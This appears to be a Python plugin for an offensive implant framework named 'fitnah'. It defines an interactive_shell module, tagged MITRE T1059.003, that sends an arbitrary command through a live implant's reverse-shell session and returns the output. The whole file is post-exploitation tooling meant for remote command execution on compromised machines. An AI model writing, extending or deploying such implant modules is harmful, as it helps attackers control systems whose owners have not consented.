"""execution/interactive_shell — interactive shell session via implant reverse shell. MITRE T1059.003"""
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class InteractiveShell(BasePlugin):
    NAME        = "interactive_shell"
    DESCRIPTION = "Open an interactive shell session. Each call sends one command and returns output."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1059.003"
    CATEGORY    = "execution"
    schema      = ParamSchema().add(
        Param("cmd", str, required=True, help="Command to run in the shell"),
    )

    @mitre("T1059.003")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")
        r = ctx.exec(params["cmd"])
        if r["status"] != "ok":
            return ModuleResult.err(r["output"])
        return ModuleResult.ok(data=r["output"])
